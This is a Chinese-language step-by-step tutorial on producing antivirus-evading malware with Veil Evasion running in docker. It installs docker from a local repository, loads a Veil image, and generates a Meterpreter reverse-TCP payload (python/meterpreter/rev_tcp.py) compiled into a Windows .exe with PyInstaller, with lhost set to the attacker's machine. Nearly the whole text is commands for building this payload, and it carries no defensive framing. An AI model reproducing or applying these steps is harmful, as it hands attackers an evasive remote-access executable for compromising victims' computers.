## 利用veil的docker制作免杀
#### 1.安装docker包
```shell
#1.安装Linux操作系统

#2.配置IP地址

#3.修改yum配置文件，指定为本地光盘源安装
vim /etc/yum.repo.d/a.repo
[a]
baseurl=file:///a/AppStream
gpgcheck=0
enabled=1

[b]
baseurl=file:///a/BaseOS
gpgcheck=0
enabled=1

#4.安装createrepo工具为docker包创建关联
yum install createrepo

#5.将docker的rpm包导入系统的/opt/docker目录

#6.利用createrepo工具创建docker包关联
createrepo -v /opt/docker

#7.在yum文件中添加docker仓库
[c]
baseurl=file:///opt/docker
gpgcheck=0
enabled=1

#8.安装docker
yum install docker-*
```

#### 2.导入veil容器
```shell
#1.查看当前docker镜像
docker images

#2.导入docker镜像
docker load < veil.tar

#3.通过bash启动镜像
docker run -it --name test 镜像名/镜像ID bash
#--name为启动的镜像命名
```

#### 3.通过veil制作免杀
```shell
#1.veil进入veil Evasion工具
veil

#2.使用Evasion工具
use Evasion

#3.查看Evasion工具支持的攻击载荷
list

#4.选择相应载荷制作免杀，这里要说明，系统要有相应的软件环境才能制作对应编程语言的免杀
#选择python/meterpreter/rev_tcp.py
use python/meterpreter/rev_tcp.py
#使用options查看载荷参数
options
#配置载荷参数中的lhost(地址为攻击机的地址)
set lhost 192.168.100.1

#5.生成载荷
generate
#出现[>] Please enter the base name for output files (default is payload): 表示输入生成载荷的名称
#选择PyInstaller,输入1
1
#生成完成后的载荷为.exe保存路径为/var/lib/veil/output/compiled/test.exe

#6.将容器内的载荷拷贝到外部
docker cp 容器ID:/var/lib/veil/output/compiled/test.exe /opt/docker
#                 文件的容器路径                          操作系统本地路径
```